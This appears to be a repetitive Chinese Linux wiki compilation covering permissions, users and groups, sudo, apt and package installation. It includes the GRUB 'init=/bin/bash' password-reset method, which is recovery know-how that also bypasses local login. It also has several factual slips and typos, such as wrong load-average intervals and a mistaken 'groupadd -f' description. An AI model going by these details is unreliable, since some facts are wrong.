查看文件。示例: 查看fileName.txt 文件的内容，对应的命令为：cat fileName.txt

标题：文件与目录权限
Linux系统下一个文件的权限包含属主、群组和其他人的权限,并且各个用户对该文件具有单独设置的权限,这是 Linux 权限模型的核心.

属主即一个文件的拥有者,一般为这个文件的创建者,但是属主可以使用chown命令转移文件的属主.

Linux下的用户都会属于一个组别，这个组别叫做群组；一个文件的属主所在的群组，除属主以外的所有人对该文件具有相同的权限。

其他人即为属主和属主所在群组以外的所有人。

用ls -l列出文件信息时，第一组字符分为两部分：第一部分指定文件类别（如“-”为普通文件、“d”为目录、“l”为链接文件等），第二部分按“属主权限-属组权限-其他人权限”顺序表示权限，且读、写、执行权限顺序不可改变。

文件权限的数字模式中，r代表4、w代表2、x代表1、-代表0；计算时将用户权限对应数字相加，如rwx=4+2+1=7，r-x=4+0+1=5，示例“rwxr-xr-x”的数字模式为755。

ls -l输出的第二组字符表示硬链接数（i节点），第三组表示文件属主，第四组表示文件属组，第五组表示文件大小（单位字节），第六组表示最近修改时间，第七组表示文件或目录名。

目录权限中，r表示可列出目录中的文件或目录情况，w表示可在目录中创建、删除和修改文件或目录，x表示可使用cd命令切换到此目录，-表示无权限；用户进入目录查看文件最少需要读和执行权限。

更改文件属主用chown命令，更改属组用chgrp命令；chown可同时修改属主和属组（格式：chown 属主.属组 文件），两命令加-R选项可递归更改目录树权限。

chmod命令用于改变文件与目录权限，权限范围u（User）、g（Group）、o（Other）、a（All）；权限代号r（4）、w（2）、x（1）、s（特殊权限）、t（粘滞位，仅对目录有效），支持字符（如chmod u+x 文件）和数字（如chmod 777 文件）模式。

Linux默认umask为0022，创建文件最大权限0666（实际0666-0022=0644），创建目录最大权限0777（实际0777-0022=0755）；修改umask为0077后，文件权限为0600、目录权限为0700。

属主即一个文件的拥有者,一般为这个文件的创建者,但是属主可以使用chown命令转移文件的属主.群组即为Linux下的用户所属的组别,一个文件的属主所在的群组,该群组除属主以外的所有人都会对该文件具有相同的权限.其他人即为属主和属主所在群组以外的所有人.

文件权限部分，所有文件可用ls -l列出信息，输出分为八组：第一组是文件类型和权限(-rwxr-xr-x)，第二组是硬链接数，第三组是文件属主，第四组是文件属组，第五组是文件大小(字节)，第六组是修改时间(Dec23)，第七组是文件名(/bin/bash)。文件类型字符包括：-普通文件、d目录、l链接文件等。文件权限有字符模式(rwx)和数字模式(755)。计算示例：rwx=4+2+1=7，r-x=4+0+1=5。

目录权限：r可列出目录内容，w可创建/删除/修改目录内文件，x可用cd切换至此目录。查看目录内文件最少需r+x权限。

图形管理：终端执行sudo nautilus可打开带root权限的文件管理器。命令管理中，chown修改属主：sudo chown root /etc/passwd；chgrp修改属组：sudo chgrp wheel /etc/passwd；chmod修改权限：chmod ugo+r file1.txt（字符模式）或chmod 0755 scriptfile.sh（数字模式）。

umask值决定新文件默认权限。通常默认为0022，文件权限=0666-0022=0644，目录权限=0777-0022=0755。设置umask 0077后，新文件权限为0600，新目录权限为0700。

标题：用户与任务
Linux系统 是一个多用户、多任务的操作系统；我们应该了解单用户多任务和多用户多任务的概念.

用户在系统中是分角色的，在Linux系统中，由于角色不同，权限和所完成的任务也不同；值得注意的是用户的角色是通过UID和识别的，特别是UID；在系统管理中，系统管理员一定要坚守UID 唯一的特性

root 用户：系统唯一，是真实的，可以登录系统，可以操作系统任何文件和命令，拥有最高权限

虚拟用户：这类用户也被称之为伪用户或假用户，与真实用户区分开来，这类用户不具有登录系统的能力，但却是系统运行不可缺少的用户，比如bin、daemon、adm、ftp、mail等；这类用户都系统自身拥有的，而非后来添加的，当然我们也可以添加虚拟用户

普通真实用户：这类用户能登录系统，但只能操作自己家目录的内容；权限有限；这类用户都是系统管理员自行添加的

单用户、多任务:同个系统用户可以多个人同时使用，完成不同工作。比如我们以beinan用户登录Linux系统，进入系统后，执行了gedit 、xmms以及msn等，还有输入法fcitx

多用户、多任务:有时可能是很多用户同时用同一个系统，但并非所有的用户都一定做同一件事；多用户可能通过远程登录来进行，比如对服务器的远程控制，只要有用户权限任何人都可以上去操作或访问

从安全角度来说，多用户管理的系统更为安全，比如beinan用户下的某个文件不想让其它用户看到，只是设置一下文件的权限，只有beinan一个用户可读可写可编辑就行了；Linux系统 在多用户下表现最佳，能很好的保护每个用户的安全

我们常用的Windows 操作系统，它在系统权限管理的能力只能说是一般般，根本没有办法和Linux系统或Unix 类系统相比

系统管理员若想知道某一时刻用户的行为，可以使用w命令。w命令第一行显示系统的汇总信息，字段分别表示系统当前时间、系统运行时间、登陆用户总数及系统平均负载（过去1、5、10分钟内的负载程度，数值越小负载越轻）

w命令输出从第二行开始为表格，共8个栏目：USER（登陆用户帐号名）、TTY（用户登陆所用的终端）、FROM（用户登陆位置）、LOGIN@（登陆时间）、IDLE（用户空闲时间）、JCPU（终端相关进程CPU时间）、PCPU（当前任务CPU时间）、WHAT（当前执行任务）

系统管理员若想知道某一时刻登陆的用户，可以使用who命令；who命令输出信息与w命令相似，加-HIT选项可显示标题栏（-H）、空闲时间（-I）、是否接受信息（-T）；MESG栏显示“+”表示用户愿意接受信息，此时可使用MESG命令发信息

系统管理员想知道用户登陆历史行为，可使用last命令；last命令显示/var/log/wtmp文件内容（二进制格式，不可直接用文本编辑器查看），输出含WTMP BEGINS（wtmp文件起始时间）；加用户名可查特定用户，用last | less可分页查看

pkill强制注销指定登陆活动，使用pkill -kill -t [TTY]命令（[TTY]为用户登录终端名）；执行后可使用w命令验证是否成功

终端执行以下命令可实现用户自行登出：gnome-session-quit --logout --force（gnome-session登出）、pkill -9 gnome-session（杀死gnome-session登出）、sudo restart lightdm（重启lightdm登陆管理器）

用户在系统中是分角色的，在Linux系统中，由于角色不同，权限和所完成的任务也不同；值得注意的是用户的角色是通过UID和识别的，特别是UID；在系统管理中，系统管理员一定要坚守UID 唯一的特性。root 用户：系统唯一，是真实的，可以登录系统，可以操作系统任何文件和命令，拥有最高权限。虚拟用户：这类用户也被称之为伪用户或假用户，与真实用户区分开来，这类用户不具有登录系统的能力，但却是系统运行不可缺少的用户，比如bin、daemon、adm、ftp、mail等；这类用户都系统自身拥有的，而非后来添加的，当然我们也可以添加虚拟用户。普通真实用户：这类用户能登录系统，但只能操作自己家目录的内容；权限有限；这类用户都是系统管理员自行添加的。

单用户、多任务：同个系统用户可以多个人同时使用，完成不同工作。比如我们以beinan用户登录Linux系统，进入系统后，我要打开gedit来写文档，但在写文档的过程中，我感觉少点音乐，所以又打开xmms 来点音乐；当然听点音乐还不行，MSN 还得打开，想知道几个弟兄现在正在做什么，这样一样，我在用beinan 用户登录时，执行了gedit 、xmms以及msn等，当然还有输入法fcitx ；这样说来就有点简单了，一个beinan用户，为了完成工作，执行了几个任务。

多用户、多任务：有时可能是很多用户同时用同一个系统，但并不所有的用户都一定都要做同一件事，所以这就有多用户多任务之说。比如Linux系统Sir.Org 服务器，上面有FTP 用户、系统管理员、web 用户、常规普通用户等，在同一时刻，可能有的弟兄正在访问论坛；有的可能在上传软件包管理子站；在与此同时，可能还会有系统管理员在维护系统；浏览主页的用的是nobody 用户，大家都用同一个，而上传软件包用的是FTP用户；管理员的对系统的维护或查看，可能用的是普通帐号或超级权限root帐号；不同用户所具有的权限也不同，要完成不同的任务得需要不同的用户。值得注意的是：多用户多任务并不是大家同时挤到一接在一台机器的的键盘和显示器前来操作机器，多用户可能通过远程登录来进行。

多用户系统从事实来说对系统管理更为方便。从安全角度来说，多用户管理的系统更为安全，比如beinan用户下的某个文件不想让其它用户看到，只是设置一下文件的权限，只有beinan一个用户可读可写可编辑就行了，这样一来只有beinan一个用户可以对其私有文件进行操作。Linux系统 在多用户下表现最佳，Linux系统能很好的保护每个用户的安全。

系统管理员若想知道某一时刻用户的行为，可以使用w命令。第一行显示系统的汇总信息，字段分别表示系统当前时间、系统运行时间、登陆哟内用户总数及系统平均负载信息。对于上述数据中的几个显示数据意义为：2: 31PM 表示执行W的时间是在下午2点31分；11DAYS，81：18 表示系统运行11天零21小时18分；4 USERS 表示当前系统登陆用户总数为4；LOAD AVERAGE 与后面的数字一起表示系统在过去1，5，10分钟内的负载程度，数值越小，系统负载越轻。

标题：用户与群组
每个LINUX登陆的使用者至少都会取得两个ID：使用者ID(User ID，简称UID)和群组ID(Group ID，简称GID)。这是LINUX下用户与群组最基础的知识。LINUX系统通过UID(User Identification)识别用户，分为三类：超级管理员(UID 0，默认禁止直接登录)、系统用户(UID 1-499，可使用sudo)和普通用户(UID 500-65535)。

/etc/passwd文件存储用户信息，每行格式为：用户名：密码：用户ID：主要组ID：GECOS：主目录：登录shell。密码字段显示为'x'表示实际密码存在/etc/shadow中。例如：'root:x:0:0:root:/root:/bin/bash'表示root用户。

添加用户使用useradd命令：'sudo useradd hilbert'创建基本账户；添加详情可指定参数如：'sudo useradd -d /home/math/hilbert -g faculty -s /bin/sh hilbert'。删除用户用userdel命令：'sudo userdel -r hilbert'彻底删除账户及家目录。

群组信息存在/etc/group中，格式为：groupname:password:gid:members。添加群组用'groupadd cjh'，删除用'groupdel cjh'。修改群组成员：'gpasswd -a cxbii root'添加用户到组，'gpasswd -d cxbii root'从组移除用户。

身份切换：su命令直接切换用户需目标用户密码（如'su root'），su -同时切换环境。sudo临时获取root权限（5分钟时效），配置在/etc/sudoers中。解决sudo权限错误：在/etc/sudoers添加'username ALL=(ALL)ALL'。

忘记密码的解决方案：开机按Shift进入引导菜单→编辑启动项→行末添加'rw init=/bin/bash'→Ctrl-X启动→执行'passwd 用户名'重置密码。用户权限不默认root因其权限过大危险，日常使用需sudo临时提权。

每个LINUX登陆的使用者至少都会取得两个 ID:使用者 ID (User ID ，简称 UID)和群组 ID (Group ID ，简称 GID)。这个是LINUX下用户与群组最基础的知识。

LINUX系统通过UID(User Identification)识别用户，而非用户名。LINUX的用户分为三类：超级管理员（UID为0，即root用户，具有操作整个系统的所有权限，默认禁止该账户直接登录）、系统用户（UID范围1~499，能够登录系统获得有限权限，可使用sudo获取root权限，默认系统用户为普通用户）、普通用户（UID范围500~65535，目前支持到4294967295，由前两类用户建立，只能执行普通操作）。

用户信息保存在/etc/passwd中，该文件以行为单位，每行定义系统上的一个用户，行内字段用冒号隔开，依次为：用户名：密码：用户ID：主要组ID：GECOS：主目录：登录shell。密码字段在旧UNIX系统含加密密码，现代Linux中显示为x或*号（实际密码存于/etc/shadow）；GECOS为用户全名，不可用于登录；主目录是用户登录时Shell的当前工作目录；RedHat企业版中登录Shell通常为/bin/bash。

为提升安全性，现代Linux采用“影子密码”，用户加密密码保存在/etc/shadow中，该文件仅root用户可查看，普通用户无权限。/etc/shadow文件含九个冒号分隔的字段，依次为：用户名：加密密码：上次更改密码的时间：最小更改密码间隔：密码有效期限：密码过期提示时间：密码锁定期：账户有效期：保留字段。其中，加密密码字段为x时表示用户不能登录；上次更改密码时间是从1970年01月01日起的天数；账户有效期字段为空则帐号永久可用。

Linux中添加用户可使用useradd和adduser命令。useradd是ELF可执行程序，终端执行sudo useradd hilbert可创建用户hilbert，默认不在/home目录创建家目录、不提示设密码，密码区域为*号（禁用账号，需指定密码后启用）；可加参数定制，如sudo useradd -c "David Hilbert" -d /home/math/hilbert -g faculty -G famous -m -s /bin/sh hilbert，其中-c设全名、-d设家目录、-g设首要组、-G设附加组、-m创建家目录、-s设Shell。adduser是perl脚本，终端执行sudo adduser hilbert可交互式创建用户，自动设置家目录，无密码和系统Shell；其-p参数不能加密密码。useradd -D可查看默认设置，也可联用-D与其他参数设默认值。

usermod命令用于修改用户账户设置，语法为usermod [-LU][-c <备注>][-d <登入目录>][-e <有效期限>][-f <缓冲天数>][-g <群组>][-G <群组>][-l <帐号名称>][-s <shell>][-u <uid>][用户帐号]。常用参数：-c改备注文字、-d改登入目录、-e改帐号有效期限、-f改密码过期后关闭帐号的缓冲天数、-g改所属群组、-G改附加群组、-l改帐号名称、-L锁定密码（使密码无效）、-U解除密码锁定、-u改用户ID。例如sudo usermod -e 2015-07-04 hilbert设hilbert账号2015年07月04日到期；usermod不允许修改在线用户的帐号名称，修改用户ID前需确认用户无运行程序，还需手动改其crontab和at工作档，NIS server需改相关NIS设定。

userdel命令用于删除用户账户，sudo userdel hilbert仅删除用户在passwd、shadow、group文件中的相关条目，不删除家目录；sudo userdel -r hilbert除删除上述条目外，还会删除用户的家目录。

Linux引入群组功能以方便用户共享资源，每用户属一个群组，每群组有GID（group标示符），所有群组及对应GID存于/etc/group。系统创建用户时，会自动创建同名群组并将用户加入，用户也可加入其他群组以获取访问特定资源的权限；若文件属某群组，则该群组所有用户可存取该文件。

/etc/group文件控制用户分组，格式为groupname:password:gid:members，含四个冒号分隔的字段：组名（字母或数字构成，不重复）、口令（一般为空或x，存加密后的群组口令）、GID（组标识号）、组内用户列表（用户间用逗号分隔，可为空，空表示群组为GID对应的用户名）。例如root:x:0:表示root群组，GID为0，无成员；adm:x:4:cxbii表示adm群组，GID为4，成员为cxbii。

Linux群组密码存于/etc/gshadow文件，仅特权用户可访问，一般很少用到。该文件含四个冒号分隔的字段：群组名称、密码（x表示有群组登录密码）、群组GID、群组成员。例如/etc/group中root:x:0:对应/etc/gshadow中相关条目，adm:x:4:cxbii表示adm群组有密码（x）、GID为4、成员为cxbii。

groupadd命令用于添加群组，语法为groupadd [-g gid [-o]] [-r] [-f] group；-g指定GID（默认≥500，0~999保留给系统帐号）、-r建立系统帐号（GID小于/etc/login.defs中UID_MIN）、-f若群组已存在则报错。例如sudo groupadd cjh创建cjh群组，sudo groupadd -g 344 cjh创建GID为344的cjh群组。groupdel命令用于删除群组，sudo groupdel cjh删除cjh群组。gpasswd命令用于设置/取消群组密码、修改成员：sudo gpasswd group_name设密码，sudo gpasswd -r group_name取消密码（取消后仅成员可通过newgrp切换入组）；-a添加用户到组（如sudo gpasswd -a cxbii root）、-d从组删除用户（如sudo gpasswd -d cxbii root）、-A指定管理员、-M指定成员、-R限制仅成员可newgrp入组。

su（Switch user）用于切换用户，普通用户切换到其他用户需输入目标用户密码，root切换到普通用户无需密码。语法：su [-fmp] [-c command] [-s shell] [--help] [--version] [-] [USER [ARG]]。常用参数：-f不读启动档（csh/tcsh）、-m/-p不改变环境变量、-c执行命令后返回原用户、-s指定Shell、-/-l重新登录（改变环境变量和工作目录，默认root）。例如su -c ls root变更为root执行ls后返回原用户；su - clsung变更为clsung并切换到其家目录。su与su -的区别：su仅切换身份，Shell环境仍为原用户；su -连用户和Shell环境一起切换。su的优点是灵活切换身份，缺点是切换到root需root密码，多用户知道root密码会增加泄露风险和系统隐患。

sudo允许普通用户使用超级用户或其他用户权限，无需提供root口令，利于控制root访问权限。命令格式：sudo -K | -L | -V | -h | -k | -l | -vsudo [-HPSb] [-a auth_type] [-c class|-] [-p prompt] [-u username|#uid] {-e file [...] | -i | -s | command}。常用参数：-h显示帮助、-V显示版本、-l列出当前用户可执行命令、-u指定执行命令的用户、-k清除时间戳（下次需输密码）、-K删除时间戳、-b后台执行命令、-p更改密码提示语、-e修改文件。sudo优点是避免root密码泄露，缺点是提权有5分钟时效（5分钟内无root权限操作需重新提权）。sudo配置文件为/etc/sudoers，需用visudo命令修改（校验配置正确性），缺省配置root ALL=(ALL) ALL，添加support ALL=(ALL) ALL可让support用户拥有root所有权限。

Linux忘记登录密码时，解决步骤如下：1.开机按住Shift键至引导菜单（wubi安装则在Windows启动菜单选深度操作系统，按Shift+Enter）；2.光标选深度操作系统启动项，按e键；3.光标移到“linux /boot/....”行，按End键到行尾，加空格和rw init=/bin/bash；4.按Ctrl-X启动至提示符；5.执行passwd <用户名>（如passwd sam），输两次新密码；6.按Ctrl-Alt-Del重启，用新密码登录。该方法适用于所有使用Grub2的Linux系统。

终端使用sudo提权时出现“xx用户不在 sudoers 文件中。此事将被报告”，原因是sudo配置文件/etc/sudoers出错。解决方法：用su切换到root，终端执行sudo gedit /etc/sudoers，在文件中添加xx ALL=(ALL) ALL（xx为出错用户名），保存退出即可。/etc/sudoers中缺省有root ALL=(ALL:ALL) ALL、%admin ALL=(ALL:ALL) ALL、%sudo ALL=(ALL) ALL等配置。

Linux系统账户默认不是root，且登录管理器默认屏蔽root直接登录，原因是root权限过大，作为日常账户使用过于危险。需临时使用root权限时，可通过sudo命令临时获取。

Linux系统重视密码安全，用户在终端输入密码时，终端不会回显（不产生****等占位符），只需盲打密码后回车即可。

标题：linux 权限管理
linux作为一个服务器起家的操作系统，比相对工作站起家的windows有着更加注重安全性的传统。在linux中管理安全性的技术有：1. UGO；1. ACL；1. SELinux；1. PAM。

UGO （User、Group、Other）即用户，用户组，他人，三个主体的权限组合。使用ls -l命令可输出当前文件夹的UGO权限信息，例如：-rw-r-xr--  1 htqx htqx    3328 1月  20 10:31 cmake_install.cmake。

ls -l输出的UGO权限信息组成：1.第一个字符表示文件的类型：d目录、l链接、s套接字、b块设备、c字符设备、p管道、-普通文件；2.后续三个字符为一组，表示用户、用户组、他人的权限，其中r代表读、w代表写、x代表可执行；3.htqx 是用户名；4.htqx 是用户组。

linux权限可用数字表示：4代表读、2代表写、1代表可执行，数字可相加组合，如3=2+1、5=4+1、6=4+2、7=4+2+1。例如756表示用户读写+执行，用户组只读+执行，他人读写。linux程序或脚本的可执行性通过权限x定义，而非windows的文件类型（扩展名）。

修改文件权限用chmod命令：u代表用户、g代表用户组、o代表他人、a代表三者；+增加权限、=设置权限、-删除权限；也可用数值设置。例：chmod u+r filename（给用户加读权限）、chmod go=wx filename（设置用户组和他人为wx权限）、chmod 721 filename（数值721设权限）。改变文件用户和用户组用chown命令，例：sudo chowm root:root filename（改成root用户和组）。

文件夹的UGO权限意义与文件不同：r表示列出文件、w表示删除文件、x表示进入文件夹（如cd命令）；rx表示只读、wx表示可写。一般文件夹需rw权限（因读取操作常需进入文件夹）。

linux权限实际有4组，第4组为扩展位（隐藏）。文件可执行时：4表示借用用户权限、2表示借用用户组权限；文件夹时：2表示目录内文件继承用户组（递归）、1表示目录内文件不可所属用户之外的人删除（非递归）。例：sudo chmod u+s hwclock（设u+s=4，借用用户权限）、sudo chmod 4755 hwclcok（数字设扩展位）。

linux默认创建的文件基础权限是666，文件夹是777，同时有蒙版umask，默认值为022。权限计算方式：文件权限=666-umask（如666-022=644），文件夹权限=777-umask（如777-022=755）。查看umask用umask命令，修改umask用umask 新值（例：umask 002）。

ACL（Access Control List）即访问控制表，相比UGO提供多用户、多用户组控制能力，但需文件系统支持。文件系统需通过acl选项挂载（例：mount -t ext4 -o rw,acl /dev/sda1 /mnt）。ls -l中权限位后有+表示有ACL权限。查看ACL用getfacl命令（例：getfacl hwclock），设置ACL用setfacl命令（例：sudo setfacl -m u:lp:rw,g:htqx:rx hwclock，给lp用户rw权限、htqx组rx权限），-x表示去除ACL权限。

PAM（Pluggable Authentication Modules）即可插拔认证模块，是linux账户登录验证框架。其层次结构：1.会话登录（应用层）；2.PAM-API 接口层（系统管理员配置模块）；3.PAM-SPI 服务模块（含认证、账号、会话、口令管理模块）。相关路径：1./etc/pam.d/（配置目录）；2./lib/security/（服务模块）；3./etc/security/（服务模块配置参数）。

linux作为一个服务器起家的操作系统，比相对工作站起家的windows有着更加注重安全性的传统。在linux中管理安全性的技术有：UGO、ACL、SELinux、PAM。

UGO（User、Group、Other）即用户，用户组，他人，三个主体的权限组合。通过ls -l可查看权限信息，权限由rwx组成：r表示读，w表示写，x表示可执行。权限也可用数字表示：4读、2写、1可执行，组合如7=4+2+1。修改权限命令：chmod u+r filename（符号法），chmod 721 filename（数字法）。修改所属关系：sudo chown root:root filename。

文件夹权限中：r权限允许列出文件，w权限允许删除文件，x权限允许进入文件夹（如cd命令）。rx组合表示只读权限，wx组合表示可写权限。

umask是权限掩码，默认创建文件权限666，文件夹权限777。umask 022表示最终权限为644（文件）和755（文件夹）。查看命令：umask；修改命令：umask 002。

ACL提供多用户/组权限控制能力。挂载要求：mount -o acl。ACL文件在ls -l中显示+标记。操作命令：getfacl查看权限，setfacl -m u:lp:rw设置权限。

PAM是可插拔认证模块框架，层次结构：1. 会话登录层 2. PAM-API接口层 3. PAM-SPI服务模块（含认证/账号/会话/口令管理模块）。配置文件路径：/etc/pam.d/，模块路径：/lib/security/，参数路径：/etc/security/。

标题：Root权限
root可以指root用户和root权限（例如安卓机中获得root权限）

root用户属于root组。root用户是整个deepin中最高权限用户，如果使用者使用root操控电脑，可以修改任何文件。但是并不建议用root用户。这是因为使用root用户，权限过大，会导致一旦操作失误，极有可能导致系统文件的损坏，系统无法正常使用。（root用户相当于windows中的adminstrastor用户）

root权限即使用root用户时，便拥有了root权限，即电脑的最高权限。在deepin中，为了保证计算机的安全，是不让用户使用root的。

倘若需要root权限，可以执行下面三条命令中的一条临时获得root权限：sudo、su - root、sudo -i。输入密码后，sudo是以root权限执行命令，而后面两条则是切换到root用户了。

标题：Apt-mark版本锁定
在执行系统更新时，Debian系统下可以使用apt-mark命令来阻止某些包的升级。阻止包的具体命令是sudo apt-mark hold <pkg>。例如，阻止升级Perl，执行apt-mark hold perl。取消阻止包的命令是sudo apt-mark unhold <pkg>。查看已阻止包的命令是sudo apt-mark showhold。

标题：apt命令
相关命令如果不了解，强烈建议复制百度后再使用；命令要在输入法英文模式下输入；一些命令执行权限不够的情况下，命令前面加sudo；sudo输入密码的时候不显示，输完密码直接按Enter(回车)执行

&& 两条命令一同输入之间的连接符号，其前后有空格；sudo apt-get update 更新软件源中的所有软件列表；sudo apt-get upgrade 更新软件；sudo apt-get dist-upgrade 更新系统版本；通常apt的更新是使用两条命令完成的；sudo apt-get -f install 修复安装”-f = –fix-missing”

sudo apt-get update && sudo apt-get dist-upgrade -y；sudo apt-get update && sudo apt dist-upgrade -y；sudo apt-get -f install；sudo dpkg --configure -a && sudo apt -f install；sudo apt --fix-broken install；sudo apt update && sudo apt full-upgrade；apt list --upgradable；sudo apt full-upgrade

apt-get remove 会删除软件包而保留软件的配置文件；apt-get purge 会同时清除软件包和软件的配置文件；sudo apt remove linux-image；sudo apt autoremove 包名 命令即可卸载上面的那些包；还有没有删除干净的内容可以用sudo apt-get autoremove来清理；remove – 卸载软件包；autoremove – 卸载所有自动安装且不再使用的软件包；purge – 卸载并清除软件包的配置

apt-get autoremove的行为重点是卸载所有自动安装，举个栗子：C 依赖于 B, D 依赖于B, 且D没有被其他手动安装的包依赖；apt-get remove C将删除C,同时提示你用apt-get autoremove去清除B,D；apt-get autoremove C 将删除B, C, D；所以，这条命令最恐怖的是在不了解的情况下，你不知道他会把系统中的什么配置文件给删除，导致需要重装系统的风险

主要记录了日常使用较高频率的终端操作命令,供大家查询使用
1. 相关命令如果不了解，强烈建议复制百度后再使用
1. 命令要在输入法英文模式下输入
1. 一些命令执行权限不够的情况下，命令前面加sudo
1. sudo输入密码的时候不显示，输完密码直接按Enter(回车)执行

`sudo apt-get update`更新软件源中的所有软件列表
`sudo apt-get upgrade` 更新软件
`sudo apt-get dist-upgrade`更新系统版本
`sudo apt-get -f install`修复安装”-f = –fix-missing”
`sudo apt-get update && sudo apt-get dist-upgrade -y`
`sudo apt --fix-broken install`
`sudo apt update && sudo apt full-upgrade`
`apt list --upgradable`

`apt-get remove`会删除软件包而保留软件的配置文件
`apt-get purge`会同时清除软件包和软件的配置文件
`sudo apt autoremove` 包名 命令即可卸载不再需要的依赖包
remove – 卸载软件包
autoremove – 卸载所有自动安装且不再使用的软件包
purge – 卸载并清除软件包的配置

apt-get autoremove的行为重点是卸载所有自动安装
例如：C 依赖于 B, D 依赖于B, 且D未被手动安装依赖
apt-get remove C将删除C,同时提示用autoremove清除B,D
autoremove C 将删除B, C, D

标题：二进制包
二进制包是已经编译好的软件包，通常是针对某个系统构架的，i686和amd64不能混用。

一般来说，除了源代码包以外的软件包都属于二进制包。deb后缀二进制包为DPKG包管理程序专用包，深度操作系统用dpkg管理，可直接安装DEB包，且能使用适合Ubuntu的DEB包。

二进制包常见后缀及用途：bin为通用发行版安装包；run为闭源显卡驱动安装包；sh为shell脚本安装包，获可执行权限后无需安装即可运行；无后缀为编译好的通用二进制包（如火狐），获可执行权限后无需安装直接运行。

deb包安装：方法一，双击DEB包，文件管理器自动用自带的Gdebi打开，按提示操作；方法二，当前目录有chrome.deb时，终端执行sudo dpkg -i chrome.deb。

bin包（以install-crossover-12.5.1.bin为例）安装：命令赋予权限sudo chmod +x 文件名，图形操作右键属性勾选执行权限；运行用./文件名，无法进入向导则用sudo ./文件名。

run包（以ati.run为例）安装：命令赋予权限sudo chmod +x ati.run，图形操作右键属性勾选执行权限；运行用./ati.run，无法进入向导则用sudo ./ati.run。

sh包（以deepin.sh为例）安装：命令赋予权限sudo chmod +x deepin.sh，图形操作右键属性勾选执行权限；运行可终端执行./deepin.sh，或双击选择在终端中运行。

无后缀包（以火狐为例）安装：复制文件sudo cp 文件名 /opt，进入目录cd /opt，解压sudo tar -xvjf 文件名，建软链接sudo ln -sf /opt/firefox/firefox /usr/bin/firefox（-f表强制覆盖）。

DEB包卸载：方法一双击原有DEB包按Gdebi提示卸载；方法二用命令，卸载chrome：sudo apt-get remove google-chrome（不删配置）、sudo apt-get --purge remove google-chrome（删配置）、sudo dpkg -r google-chrome（不删配置）、sudo dpkg --purge google-chrome（删配置）。

bin包（以crossover为例）卸载：安装路径为/opt时，反安装脚本在/opt/cxoffice/bin/cxuninstall，双击运行；需查看帮助文档获脚本路径。

run包（以ATI驱动为例）卸载：终端执行sudo sh /usr/share/ati/fglrx-uninstall.sh；需查看帮助文档获脚本路径。

sh包卸载：无需安装，直接删除其文件即可；无后缀包（以火狐为例）卸载：终端执行sudo rm -rf /opt/firefox/firefox。

注意安装程序的反安装脚本路径需查看帮助文档。

标题：源代码包
首先要说的是tar.gz不是软件包格式，而是压缩档格式，你可以把任何格式的东西压缩成tar.gz文件，就像.7z , .zip和.rar一样。你下载的tar.gz包装的软件很可能是源码，但也有的地方把二进制码打包成tar.gz的，而deb包里包装的是二进制码和少量配置文件。把源码转换到deb文件的过程需要编译软件并制作配置文件，比较麻烦。

对于常见的软件，已经有人打包好了，都可以从软件源安装，没有必要从源码安装。如果你下载的软件是源码，那么解开之后会有一个README或者INSTALL文件，安装步骤应该就写在里面。

源码包的获取源默认都是关闭的，需要手动将其开启：sudo vim /etc/apt/sources.list。将#deb-src改为deb-src保存退出后，需要刷新软件源列表：sudo apt-get update。

深度操作系统使用的所有软件的源代码都可以轻松获取。例如获取deepin-music-player源代码，只需要终端执行：sudo apt-get source deepin-music-player。

源代码包安装前需先安装gcc、make等软件：sudo apt-get update && sudo apt-get install build-essential。解压缩tar.gz包的命令是tar -zvxf ***.tar.gz，解压缩后cd进得到的文件夹，再执行./configure进行配置。

configure报错时通常提示缺少依赖，可通过新立得安装依赖，安装新立得的命令是sudo apt-get update && sudo apt-get install synaptic。配置完成后执行make编译，再执行sudo make install安装二进制文件，具体安装方法以源码中的README等帮助文件为准。

删除源码安装的软件有两种方法：方法一是在源码包目录执行make uninstall；方法二是直接删除源码程序文件。若编译前用./configure --prefix=目录名指定安装路径，后续可通过rm -rf 软件目录名彻底卸载。

不把软件全转成deb包的原因：程序源码不依赖平台，可在多种系统运行；deb包等二进制包依赖硬件和软件平台（如深度系统的deb包仅x86的ubuntu可用）。自己编译软件可得到适配自身电脑配置的版本，性能更好。

不同Linux发行版有不同二进制包格式和包管理器：debian和ubuntu用.deb包，核心工具是dpkg，apt-get是dpkg的前端；suse和fedora用rpm包，还有yum、dnf、apt、aptitude等工具。可通过man dpkg查看dpkg帮助手册。

文中提供的关于linux源码包软件安装与卸载的相关链接是：http://blog.csdn.net/samxx8/article/details/7570542。

源代码包的安装一般为下载软件源代码，然后编译安装. 常见的C程序软件的安装步骤是 configure, make, make install三部曲。首先得安装gcc、make等软件 sudo apt-get update && sudo apt-get install build-essential 解压缩你下载的tar.gz包，得到一个文件夹。 tar -zvxf ***.tar.gz 在命令行下，cd进这个文件夹 cd xxx 配置文件，终端执行： ./configure configure的时候如果报错，一般会提示你少了一些什么依赖关系。开始编译。终端执行： make 安装生成的二进制文件 sudo make install 注意：具体安装方法以软件源代码中的README等帮助文件为准。

标题：软件包
本条目简单介绍debian包管理下的软件包基本知识。

Debian包文件包含了二进制可执行文件、库文件、配置文件和man/info帮助页面等文档。通常Debian包文件的后缀为.deb，因此称为"Deb软件包"。

Debian有两种类型的软件包：二进制软件包（deb）和源码包（deb-src）。二进制软件包（Binary Packages）：包含可执行文件、库文件、配置文件、man/info页面、版权声明和其他文档。

源码包（Source Packages）：包含软件源代码、版本修改说明、构建指令以及编译工具等。先由tar工具归档为.tar.gz文件，然后再打包成.dsc文件。

用户不确定一个软件包具体类型时，可以使用file命令查看文件类型。例如终端执行"file  g++_4.1.2-9ubuntu2_i386.deb"，输出为"g++_4.1.2-9ubuntu2_i386: Debian binary package (format 2.0)"。

在Ubuntu Linux中，虚拟软件包是将系统中具有相同或相近功能的多个软件包作为一个集合，指定其中一个为默认首选项，意图是防止软件安装冲突。例如exim、sendmail和postfix的虚拟软件包是"mail-transport-agent"。

Ubuntu软件包命名约定为Filename_Version-Reversion_Architecture.deb，其中Filename是软件包名，Version是软件版本号，Reversion是修订版本号（由开发者指定，修改后加1），Architecture是适用架构。

以g++_4.1.2-9ubuntu2_i386.deb为例，g++是软件包名，4.1.2是软件版本号，9ubuntu2是修订版本号，i386是适用架构。

Ubuntu为软件包指定优先级，作为包管理器安装卸载的依据，且高优先级包不能依赖低优先级包。基本系统由Required级和Important级组成，新版本准备时先冻结这两类，再冻结Standard级，最后冻结Optional级和Extra级。

Ubuntu定义软件包的两种状态：期望状态（标记用户希望软件包处于的状态）和当前状态（标记用户操作后的最终状态），用于记录用户安装行为。

